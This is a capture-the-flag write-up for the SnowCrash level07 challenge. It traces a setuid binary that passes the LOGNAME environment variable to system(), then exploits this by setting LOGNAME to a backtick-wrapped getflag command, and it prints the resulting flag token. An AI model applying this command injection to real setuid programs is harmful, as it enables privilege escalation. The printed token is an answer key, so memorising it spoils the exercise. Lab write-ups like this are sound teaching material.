# Start

```sh
level07@SnowCrash:~$ ll
[...]
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile*
```
>> We have an executabe with effective user : flag07

```sh
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                             = 2007
geteuid()                                                                             = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                   = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                   = 0
getenv("LOGNAME")                                                                     = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff69, 0xb7e5ee55, 0xb7fed280)                   = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                = 0
+++ exited (status 0) +++
```
>> it get LOGNAME, print something with asprintf and print level07 with echo

# Exploit

If we exec with adding value to LOGNAME :

```sh
level07@SnowCrash:~$ LOGNAME=hkovac ./level07 
hkovac
```
>> print LOGNAME's value

so :

```sh
level07@SnowCrash:~$ LOGNAME="\`getflag\`" ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```